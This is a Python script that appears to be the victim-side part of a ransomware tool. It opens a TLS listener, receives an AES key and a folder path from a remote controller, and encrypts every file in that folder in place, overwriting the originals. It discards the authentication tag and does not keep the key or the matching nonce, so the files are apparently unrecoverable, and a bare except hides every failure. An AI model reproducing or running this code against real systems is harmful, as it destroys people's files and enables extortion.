import socket
import ssl
import os
from Crypto.Cipher import AES


def encrypt_files(key, folder_path, nonce):
    if os.path.exists(folder_path):
        file_list = os.listdir(folder_path)
        for file in file_list:
            file_path = os.path.join(folder_path, file)
            if os.path.isfile(file_path):
                cipher = AES.new(key, AES.MODE_EAX, nonce = nonce)
                with open(file_path, 'rb') as open_file:
                    file_data = open_file.read()
                encrypted_data, tag = cipher.encrypt_and_digest(file_data)
                with open(file_path, 'wb') as open_file:
                    open_file.truncate(0)
                    open_file.write(encrypted_data)


def main():
    context = ssl._create_unverified_context(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(r"C:\Users\anger\Downloads\server.crt", r"C:\Users\anger\Downloads\server.key")

    sock = socket.socket()
    ssock = context.wrap_socket(sock, server_side = True)

    while True:
        try:
            ssock.bind(("127.0.0.1", 42069))
            ssock.listen(1)
            print("waiting for connection...")
            conn, addr = ssock.accept()

            key = conn.recv(1024)
            cipher = AES.new(key, AES.MODE_EAX)
            nonce = cipher.nonce

            folder_path = conn.recv(1024)
            folder_path = folder_path.decode()

            encrypt_files(key, folder_path, nonce)

            conn.send("Files encrypted successfully".encode())
            print("Files encrypted successfully")

            break

        except:
            pass

    ssock.close()



if __name__ == '__main__':
    main()